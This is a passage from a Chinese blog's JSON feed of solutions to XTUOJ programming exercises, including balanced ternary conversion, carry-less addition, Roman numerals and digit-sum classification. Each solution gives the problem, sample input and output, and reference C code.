n%2;</span><br><span class=\"line\">            if(temp == 1)//统计出现次数（避免前导0）</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                cnt1++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            else</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                cnt2++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            n = n/2;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if(cnt1&gt;cnt2)//判断个数</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            printf(&quot;%d\\n&quot;,cnt1-cnt2);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else//不是好数</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            printf(&quot;0\\n&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/10/XTUOJ-1141%E5%B9%B3%E8%A1%A1%E4%B8%89%E8%BF%9B%E5%88%B62/",
            "url": "https://mangpumo.github.io/2022/11/10/XTUOJ-1141%E5%B9%B3%E8%A1%A1%E4%B8%89%E8%BF%9B%E5%88%B62/",
            "title": "XTUOJ_1141平衡三进制2",
            "date_published": "2022-11-10T06:09:39.000Z",
            "content_html": "<h1 id=\"平衡三进制2\"><a class=\"anchor\" href=\"#平衡三进制2\">#</a> 平衡三进制 2</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>平衡三进制分别使用字符 '-','0','1' 表示 - 1,0,1。下表表示从 0 到 10 的十进制数对应的平衡三进制的值。<br>\n十进制\t平衡三进制<br>\n 0\t0<br>\n1\t1<br>\n2\t1-<br>\n3\t10<br>\n4\t11<br>\n5\t1--<br>\n6\t1-0<br>\n7\t1-1<br>\n8\t10-<br>\n9\t100<br>\n10\t101<br>\n 现在给你一个十进制整数，请将其转成对应的平衡三进制的串。</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>第一行是一个整数 N，表示样例的个数。以后每行一个非负整数 x，0≤x≤2^31-1。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出一个样例的结果。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">8</span><br><span class=\"line\">0</span><br><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">14</span><br><span class=\"line\">19</span><br><span class=\"line\">27</span><br><span class=\"line\">61</span><br><span class=\"line\">37726</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0</span><br><span class=\"line\">1</span><br><span class=\"line\">1-</span><br><span class=\"line\">1---</span><br><span class=\"line\">1-01</span><br><span class=\"line\">1000</span><br><span class=\"line\">1-1-1</span><br><span class=\"line\">1-0-1-1-1-1</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int N;</span><br><span class=\"line\">    char pr[15];</span><br><span class=\"line\">    int num,i;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;N);</span><br><span class=\"line\">    while(N--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        i = 0;//必不可少 </span><br><span class=\"line\">        scanf(&quot;%d&quot;,&amp;num);</span><br><span class=\"line\">        if(num==0)</span><br><span class=\"line\">            printf(&quot;0&quot;);//0的时候 </span><br><span class=\"line\">        else</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            for(;num;i++)//转化为字符存数组 </span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                if(num%3==1)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    pr[i] = &#x27;1&#x27;;</span><br><span class=\"line\">                    num /= 3;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                else if(num%3==2)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    pr[i] = &#x27;-&#x27;;</span><br><span class=\"line\">                    num = num/3+1;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                else</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    pr[i] = &#x27;0&#x27;;</span><br><span class=\"line\">                    num /= 3;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            for(i--;i&gt;=0;i--)//倒序输出 </span><br><span class=\"line\">            printf(&quot;%c&quot;,pr[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        printf(&quot;\\n&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/10/XTUOJ-1140%E5%B9%B3%E8%A1%A1%E4%B8%89%E8%BF%9B%E5%88%B61/",
            "url": "https://mangpumo.github.io/2022/11/10/XTUOJ-1140%E5%B9%B3%E8%A1%A1%E4%B8%89%E8%BF%9B%E5%88%B61/",
            "title": "XTUOJ_1140平衡三进制1",
            "date_published": "2022-11-10T06:09:22.000Z",
            "content_html": "<h1 id=\"平衡三进制1\"><a class=\"anchor\" href=\"#平衡三进制1\">#</a> 平衡三进制 1</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>平衡三进制分别使用字符 '-','0','1' 表示 - 1,0,1。下表表示从 0 到 10 的十进制数对应的平衡三进制的值。<br>\n十进制\t平衡三进制<br>\n 0\t0<br>\n1\t1<br>\n2\t1-<br>\n3\t10<br>\n4\t11<br>\n5\t1--<br>\n6\t1-0<br>\n7\t1-1<br>\n8\t10-<br>\n9\t100<br>\n10\t101<br>\n 现在给你一个关于平衡三进制的串，请将其转成对应的十进制数。</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>一行是一个整数 N，表示样例的个数。以后每行一个平衡三进制的字符串，保证其转换成的整数可以用 32-bit 的整数表示，且全为非负整数。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出一个样例的结果。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">8</span><br><span class=\"line\">0</span><br><span class=\"line\">1</span><br><span class=\"line\">1-</span><br><span class=\"line\">1---</span><br><span class=\"line\">1-01</span><br><span class=\"line\">1000</span><br><span class=\"line\">1-1-1</span><br><span class=\"line\">1-0-1-1-1-1</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0</span><br><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">14</span><br><span class=\"line\">19</span><br><span class=\"line\">27</span><br><span class=\"line\">61</span><br><span class=\"line\">37726</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> #include &lt;string.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt; </span><br><span class=\"line\">#include &lt;math.h&gt;</span><br><span class=\"line\">char num[1005];</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int K;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;K);</span><br><span class=\"line\">    while(K--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        scanf(&quot;%s&quot;,num);//读入字符串，按位存储 </span><br><span class=\"line\">        int n=strlen(num);</span><br><span class=\"line\">        //printf(&quot;%d长度\\n&quot;,n);</span><br><span class=\"line\">        double sum=0;</span><br><span class=\"line\">        for(int i=0;i&lt;n;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            if(num[i]==&#x27;-&#x27;)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                num[i]=-1;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            else num[i]=num[i]-48;//&#x27;1&#x27; = 1;&#x27;0&#x27; = 0; 数值转换 </span><br><span class=\"line\">            sum+=(pow(3.0,n-i-1)*(int) num[i]);//计算各位并累加 </span><br><span class=\"line\">            //printf(&quot;%c数组的值\\n&quot;,num[i]);</span><br><span class=\"line\">            //printf(&quot;%lf次方的值\\n&quot;,pow(3.0,n-i));</span><br><span class=\"line\">            //printf(&quot;%.0lf累加的值\\n&quot;,sum);sum是DOUBLE类型 </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        printf(&quot;%.0lf\\n&quot;,sum);//double类型 </span><br><span class=\"line\">        memset(num,0,sizeof(num));//初始化数组为0 </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0; </span><br><span class=\"line\"> &#125; </span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/07/XTUOJ-1215A-BV/",
            "url": "https://mangpumo.github.io/2022/11/07/XTUOJ-1215A-BV/",
            "title": "XTUOJ_1215A+BV",
            "date_published": "2022-11-07T04:46:47.000Z",
            "content_html": "<h1 id=\"ab-v\"><a class=\"anchor\" href=\"#ab-v\">#</a> A+B V</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>小明很喜欢做 a+b，他但经常忘记进位，所以他算 88+12=90, 而不是 100。 现在你给了小明一些 a+b 的算式，请问他算出来会是什么？</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>第一行是一个整数 K，表示样例的个数。 每个样例占一行，为两个整数 a,b，0≤a,b≤1e9。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出一个样例的结果，不要输出前导 0。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3</span><br><span class=\"line\">1 2</span><br><span class=\"line\">5 6</span><br><span class=\"line\">55 55</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3</span><br><span class=\"line\">1</span><br><span class=\"line\">0</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int K;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;K);</span><br><span class=\"line\">    while(K--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        __int64 a,b,c=0,t=1;//c为不进位的和 </span><br><span class=\"line\">        scanf(&quot;%I64d %I64d&quot;,&amp;a,&amp;b);//注意输出格式 </span><br><span class=\"line\">        while(a||b)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            int temp = (a%10+b%10)%10;//最高位的和对10取余 </span><br><span class=\"line\">            t=t*10;</span><br><span class=\"line\">            a /= 10;//低位 </span><br><span class=\"line\">            b /= 10;//低位 </span><br><span class=\"line\">            c = c+temp*t;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        c /= 10;</span><br><span class=\"line\">        printf(&quot;%I64d\\n&quot;,c);</span><br><span class=\"line\">        c = 0;//防止C累加 </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/07/XTUOJ-1217A-BVII/",
            "url": "https://mangpumo.github.io/2022/11/07/XTUOJ-1217A-BVII/",
            "title": "XTUOJ_1217A+BVII",
            "date_published": "2022-11-07T04:46:31.000Z",
            "content_html": "<h1 id=\"ab-vii\"><a class=\"anchor\" href=\"#ab-vii\">#</a> A+B VII</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>小明非常高兴你能帮他处理那些罗马数字，他想学着自己写罗马数字，但是他不知道自己到底写对了没有。 请你帮他写个程序，能正确地将 10 进制数字转换成罗马数字，以便他能进行核对。 罗马数字是使用字母组合表示数字的。不同的字母表示的值如下表：<br>\n字母\t值<br>\n I\t1<br>\nV\t5<br>\nX\t10<br>\nL\t50<br>\nC\t100<br>\nD\t500<br>\nM\t1000<br>\n 表示规则如下：</p>\n<p>数字的值是为所有字母的值的和。比如说 II=2,XIII=13<br>\n 没有 0，比如 207 使用两个 100,1 个 5,2 个 1 表示，即 CCVII<br>\n 字母应该按值的降序从左到右排列，但为了避免太多的重复（比如 IIII），使用减法来缩短式子<br>\n使用 I 在 V 和 X 前，表示 4 (IV) 和 9 (IX)<br>\n 使用 X 在 L 和 C 前，表示 40 (XL) 和 90 (XC)<br>\n 使用 C 在 D 和 M 前，表示 400 (CD) 和 900 (CM)</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>每行输入一个整数 n，1≤n≤10,000。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出对应十进制整数的罗马数字。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">9999</span><br><span class=\"line\">10000</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">I</span><br><span class=\"line\">II</span><br><span class=\"line\">III</span><br><span class=\"line\">IV</span><br><span class=\"line\">MMMMMMMMMCMXCIX</span><br><span class=\"line\">MMMMMMMMMM</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int m;</span><br><span class=\"line\">    while(scanf(&quot;%d&quot;,&amp;m) != EOF)</span><br><span class=\"line\">    &#123;//很简单的一道题，不要贪心，不要DP，只需要暴力解决！</span><br><span class=\"line\">        while(m&gt;=1000)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 1000;</span><br><span class=\"line\">            printf(&quot;M&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">         while(m&gt;=900)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 900;</span><br><span class=\"line\">            printf(&quot;CM&quot;);</span><br><span class=\"line\">        &#125;    </span><br><span class=\"line\">        while(m&gt;=500)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 500;</span><br><span class=\"line\">            printf(&quot;D&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        while(m&gt;=400)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 400;</span><br><span class=\"line\">            printf(&quot;CD&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        while(m&gt;=100)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 100;</span><br><span class=\"line\">            printf(&quot;C&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        while(m&gt;=90)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 90;</span><br><span class=\"line\">            printf(&quot;XC&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        while(m&gt;=50)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 50;</span><br><span class=\"line\">            printf(&quot;L&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        while(m&gt;=40)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 40;</span><br><span class=\"line\">            printf(&quot;XL&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        while(m&gt;=10)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 10;</span><br><span class=\"line\">            printf(&quot;X&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        while(m&gt;=9)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 9;</span><br><span class=\"line\">            printf(&quot;IX&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        while(m&gt;=5)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 5;</span><br><span class=\"line\">            printf(&quot;V&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        while(m&gt;=4)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 4;</span><br><span class=\"line\">            printf(&quot;IV&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        while(m&gt;=1)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m -= 1;</span><br><span class=\"line\">            printf(&quot;I&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        printf(&quot;\\n&quot;);</span><br><span class=\"line\">        m = 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/07/XTUOJ-1055%E6%95%B4%E6%95%B0%E5%88%86%E7%B1%BB/",
            "url": "https://mangpumo.github.io/2022/11/07/XTUOJ-1055%E6%95%B4%E6%95%B0%E5%88%86%E7%B1%BB/",
            "title": "XTUOJ_1055整数分类",
            "date_published": "2022-11-07T04:46:07.000Z",
            "content_html": "<h1 id=\"整数分类\"><a class=\"anchor\" href=\"#整数分类\">#</a> 整数分类</h1>\n<h2 id=\"description\"><a class=\"anchor\" href=\"#description\">#</a> Description</h2>\n<p>按照下面方法对整数 x 进行分类：如果 x 是一个个位数，则 x 属于 x 类；否则将 x 的各位上的数码累加，得到一个新的 x，依次迭代，可以得到 x 的所属类。比如说 24，2+4=6，则 24 的类别数是 6；39，3+9=12，1+2=3，则 39 的类别数是 3。</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>每行输入一个非负整数 n，n≤10^500，n 为 0 时结束。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出对应整数的分类数。</p>\n<h2 id=\"sample-input\"><a class=\"anchor\" href=\"#sample-input\">#</a> Sample Input</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">24</span><br><span class=\"line\">39</span><br><span class=\"line\">0</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"sample-output\"><a class=\"anchor\" href=\"#sample-output\">#</a> Sample Output</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">6</span><br><span class=\"line\">3</span><br></pre></td></tr></table></figure><br>\n## 参考源码<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char x[500];//用字符形式方便存储每一位的数字</span><br><span class=\"line\">    while(scanf(&quot;%s&quot;,x) != EOF)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if(x[0]==&#x27;0&#x27;&amp;&amp;x[1]==&#x27;\\0&#x27;)//当输入0时退出</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            break;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        int i=0,count=0,temp=0;//一定要注意初始化，初始化不可以放在循环外面</span><br><span class=\"line\">        while(x[i] != &#x27;\\0&#x27;)//判断数字到哪里了</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            temp = temp+x[i]-&#x27;0&#x27;;//把每一位累加，注意将字符型转换为整形</span><br><span class=\"line\">            i++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        while(temp&gt;0)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            count = count + temp%10;//将位数进行第一次计算</span><br><span class=\"line\">            temp /= 10;//确保上一步正常进行</span><br><span class=\"line\">            </span><br><span class=\"line\">            if(count&gt;9&amp;&amp;temp==0)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                temp = count;//结果大于10，再来一次</span><br><span class=\"line\">                count = 0;//重新初始化</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        printf(&quot;%d\\n&quot;,count);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
